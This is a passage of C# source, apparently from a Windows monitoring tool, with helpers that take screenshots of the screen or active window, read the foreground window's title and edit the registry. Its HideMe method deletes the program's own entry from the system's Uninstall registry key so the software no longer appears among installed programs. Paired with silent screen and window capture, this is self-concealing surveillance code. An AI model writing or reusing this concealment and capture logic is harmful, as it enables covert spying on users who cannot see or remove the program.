                CaptureScreenToFile(sFileName, ImageFormat.Png);

                return sFileName;
            }
            public static string CaptureActiveWindow()
            {
                string sFileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, cls_Utility.UniqFileName("shot", "bmp"));
                CaptureScreenToFile(sFileName, ImageFormat.Png);

                ScreenCapture sc = new ScreenCapture();                
                sc.CaptureWindowToFile(GetForegroundWindow(), sFileName, ImageFormat.Png);

                return sFileName;
            }

            
            /// <summary>
            /// Helper class containing Gdi32 API functions
            /// </summary>
            private class GDI32
            {

                public const int SRCCOPY = 0x00CC0020; // BitBlt dwRop parameter
                [DllImport("gdi32.dll")]
                public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest,
                    int nWidth, int nHeight, IntPtr hObjectSource,
                    int nXSrc, int nYSrc, int dwRop);
                [DllImport("gdi32.dll")]
                public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth,
                    int nHeight);
                [DllImport("gdi32.dll")]
                public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
                [DllImport("gdi32.dll")]
                public static extern bool DeleteDC(IntPtr hDC);
                [DllImport("gdi32.dll")]
                public static extern bool DeleteObject(IntPtr hObject);
                [DllImport("gdi32.dll")]
                public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);
            }

            /// <summary>
            /// Helper class containing User32 API functions
            /// </summary>
            private class User32
            {
                [StructLayout(LayoutKind.Sequential)]
                public struct RECT
                {
                    public int left;
                    public int top;
                    public int right;
                    public int bottom;
                }
                [DllImport("user32.dll")]
                public static extern IntPtr GetDesktopWindow();
                [DllImport("user32.dll")]
                public static extern IntPtr GetWindowDC(IntPtr hWnd);
                [DllImport("user32.dll")]
                public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);
                [DllImport("user32.dll")]
                public static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);
            }
        }


        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        public static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        /// <summary>
        /// Helper class containing Registrey API functions
        /// </summary>
        public class cls_Registry
        {
            private static RegistryKey getHomeRegistryKey(string s_KeyPath)
            {
                string s_homeKey = s_KeyPath.Substring(0, s_KeyPath.IndexOf("\\")).ToLower();

                if (s_homeKey.Contains("machine"))
                {
                    return Registry.LocalMachine;
                }
                else if (s_homeKey.Contains("user"))
                {
                    return Registry.CurrentUser;
                }
                else if (s_homeKey.Contains("root"))
                {
                    return Registry.ClassesRoot;
                }
                return null;
            }
            private static string removeHomeKeyString(string s_KeyPath)
            {
                return s_KeyPath.Remove(0, s_KeyPath.IndexOf("\\") + 1);
            }
            private static string getKeyName(string sKeyFullPath)
            {                
                string []results = sKeyFullPath.Split(new string[] { "\\" }, StringSplitOptions.None);
                return results[results.Length-1];
            }
            public static bool DeleteKey(string keyPath, string keyName)
            {                
                string InstallerRegLoc = removeHomeKeyString(keyPath);
                RegistryKey root = getHomeRegistryKey(keyPath);

                RegistryKey homeKey = root.OpenSubKey(InstallerRegLoc, true);
                RegistryKey appSubKey = homeKey.OpenSubKey(keyName);
                if (null != appSubKey)
                {
                    homeKey.DeleteSubKey(keyName);
                    return true;
                }
                return false;
            }
            public static bool CreateKey(string keyPath, string keyName)
            {
                string InstallerRegLoc = removeHomeKeyString(keyPath);
                RegistryKey root = getHomeRegistryKey(keyPath);

                RegistryKey homeKey = root.OpenSubKey(InstallerRegLoc, true);
                RegistryKey appSubKey = homeKey.OpenSubKey(keyName);
                if (homeKey.CreateSubKey(keyName) != null)
                    return true;

                return false;
            }

            public static bool SetValue(string keyPath, string keyName, string valueName, object valueValue)
            {

                string InstallerRegLoc = removeHomeKeyString(keyPath);
                RegistryKey root = getHomeRegistryKey(keyPath);                

                RegistryKey homeKey = root.OpenSubKey(InstallerRegLoc, true);
                RegistryKey appSubKey = homeKey.OpenSubKey(keyName, true);
                if (null != appSubKey)
                {                    
                    
                    appSubKey.SetValue(valueName, valueValue, RegistryValueKind.String);
                    return true;
                }
                return false;
            }

            public static bool HideMe()
            {
                //string registry_key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
                //using (Microsoft.Win32.RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key, true))
                //{
                //    try
                //    {
                //        key.DeleteSubKeyTree(cls_Utility.processName);

                //        return true;
                //    }catch(Exception ex)
                //    {
                //        throw ex;
                //    }
                //}

                string registry_key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key, true))
                {
                    //List<string> apps = new List<string>();

                    foreach (string subkey_name in key.GetSubKeyNames())
                    {
                        using (RegistryKey subkey = key.OpenSubKey(subkey_name))
                        {
                            string s = (string)subkey.GetValue("DisplayName");
                            if (s != null && s == cls_Utility.processName)
                            {
                                key.DeleteSubKeyTree(subkey_name);
                                return true;
                            }
                                
                        }
                    }

                    return false;
                }

                //string InstallerRegLoc = @"Software\Microsoft\Windows\CurrentVersion\Uninstall";
                //RegistryKey homeKey = (Registry.LocalMachine).OpenSubKey(InstallerRegLoc, true);
                //RegistryKey appSubKey = homeKey.OpenSubKey(cls_Utility.processName);
                //if (null != appSubKey)
                //{
                //    homeKey.DeleteSubKey(cls_Utility.processName);
                //    return true;
                //}
                //return false;
            }
        }
    }
}
